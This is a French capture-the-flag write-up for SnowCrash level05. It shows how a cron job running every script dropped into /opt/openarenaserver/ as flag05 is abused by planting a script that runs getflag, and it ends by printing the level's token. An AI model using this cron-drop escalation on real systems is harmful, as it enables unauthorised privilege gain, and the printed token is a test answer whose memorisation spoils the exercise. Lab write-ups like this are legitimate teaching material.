# level05

1) Information reçue a la connexion

```bash
You have new mail.
```

2) Analyse de la mailbox

```bash
level05@SnowCrash:~$ ls -l /var/mail/level05
-rw-r--r--+ 1 root mail 58 Oct 7 08:14 /var/mail/level05
```

* Le mailbox de `level05` contient une entrée cron indiquant que `/usr/sbin/openarenaserver` est exécuté toutes les 2 minutes en tant que l'utilisateur `flag05`.
```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

* On verifie Le binaire `/usr/sbin/openarenaserver`

Il exécute **tous** les scripts présents dans `/opt/openarenaserver/` puis supprime chaque script après exécution.
```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

3) Exploitation pour récupérer le token :

* On crée `/opt/openarenaserver/script.sh` contenant `getflag > /tmp/token` et rends le fichier exécutable.

Lors de la prochaine exécution du service, `getflag` a été lancé en tant que `flag05` et a écrit le token dans `/tmp/token`.

```bash
level05@SnowCrash:/$ cat /tmp/token
Check flag.Here is your token : ...
```

4) Token découvert :

Le token est `viuaaale9huek52boumoomioc`.
